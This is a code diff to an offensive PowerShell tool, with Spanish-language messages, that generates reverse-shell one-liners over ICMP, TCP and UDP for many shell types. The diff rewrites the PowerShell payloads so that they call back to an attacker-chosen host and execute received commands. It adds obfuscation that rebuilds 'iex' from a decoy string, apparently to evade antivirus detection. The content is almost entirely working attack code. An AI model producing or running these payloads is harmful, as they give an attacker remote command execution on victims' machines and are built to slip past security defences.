@@ -1,4 +1,4 @@
-﻿param(
+param(
 [string]$Lhost=$null,[string]$Lport=$null,[switch]$web,[switch]$netcat,[switch]$python,[switch]$python3,[switch]$bash,[switch]$perl,[switch]$php,[switch]$ruby,[switch]$java,[switch]$xterm,[switch]$socat,[switch]$metasploit,[switch]$PowershellICMP,[switch]$PowershellTCP,[switch]$PowershellUDP
 
 )
@@ -273,16 +273,17 @@ p.waitFor()"@
 $r_xterm = @"
 xterm -display $Lhost":"$Lport
 "@
+
 $r_PowershellICMP = @"
-powershell.exe -c "`$ip='$LHOST'; `$ic=New-Object System.Net.NetworkInformation.Ping; `$po=New-Object System.Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('$env:Temp\a',`$rs.Substring(7)); f('.'); } else { try { `$rt=(iex -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }"
+powershell.exe -c "`$ip='$LHOST'; `$x = 'cabesha-ei-chixaka'; Set-alias cabesha-ei-chixaka (`$x[`$true-10] + (`$x[[byte]('0x' + 'FF') - 265]) + `$x[[byte]('0x' + '9a') - 158]);`$ic=New-Object Net.NetworkInformation.Ping; `$po=New-Object Net.NetworkInformation.PingOptions; `$po.DontFragment=`$true; function f(`$b) { `$ic.Send(`$ip,60000,([text.encoding]::ASCII).GetBytes(`$b),`$po) }; `$p = -join('PS ',(gl).path,'> '); f(`$p); while (`$true) { `$r = f(''); if (!`$r.Buffer) { continue }; `$rs=([text.encoding]::ASCII).GetString(`$r.Buffer); if (`$rs.StartsWith('EXIT')) { exit }; if (`$rs.StartsWith('UPLOAD')) { [io.file]::AppendAllText('$env:Temp\a',`$rs.Substring(7)); f('.'); } else { try { `$rt=(cabesha-ei-chixaka -Command `$rs | Out-String); } catch { f(`$_) }; `$i=0; while (`$i -lt `$rt.length-120) { f(`$rt.Substring(`$i,120)); `$i -= -120; }; f(`$rt.Substring(`$i)); `$p = -join('PS ',(gl).path,'> '); f(`$p); }; }"
 "@
 
 $r_PowershellTCP = @"
-powershell.exe -c "`$c = New-Object System.Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (iex `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()"
+powershell.exe -c "`$x = 'cabesha-ei-chixaka'; Set-alias cabesha-ei-chixaka (`$x[`$true-10] + (`$x[[byte]('0x' + 'FF') - 265]) + `$x[[byte]('0x' + '9a') - 158]);`$c = New-Object Net.Sockets.TCPClient('$Lhost',$Lport);`$str = `$c.GetStream();[byte[]]`$b = 0..65535|%{0};while((`$i = `$str.Read(`$b, 0, `$b.Length)) -ne 0){;`$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$b,0, `$i);`$sendback = (cabesha-ei-chixaka `$d 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ';`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$str.Write(`$sb,0,`$sb.Length);`$str.Flush()};`$c.Close()"
 "@
 
 $r_PowershellUDP = @"
-powershell.exe -c "`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (iex `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()"
+powershell.exe -c "`$x = 'cabesha-ei-chixaka'; Set-alias cabesha-ei-chixaka (`$x[`$true-10] + (`$x[[byte]('0x' + 'FF') - 265]) + `$x[[byte]('0x' + '9a') - 158]);`$end = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("$Lhost"),$Lport);`$c = New-Object System.Net.Sockets.UDPClient(53);[byte[]]`$bytes = 0..65535|%{0};`$sb = ([text.encoding]::ASCII).GetBytes('PS> ');`$c.Send(`$sb,`$sb.Length,`$end);while(`$true){;`$receivebytes = `$c.Receive([ref]`$end);`$returndata = ([text.encoding]::ASCII).GetString(`$receivebytes);`$sendback = (cabesha-ei-chixaka `$returndata 2>&1 | Out-String );`$sb = ([text.encoding]::ASCII).GetBytes(`$sendback);`$c.Send(`$sb,`$sb.Length,`$end)};`$c.Close()"
 "@
 
 
@@ -389,3 +390,4 @@ if ($PowershellTCP -eq $true -and $metasploit -eq $true) {Write-Host "[" -Foregr
 if ($Powershelludp -eq $true -and $metasploit -eq $true) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Metasploit no compatible con PowerShellUDP (proximas updates...)`n" }
 
 }
+
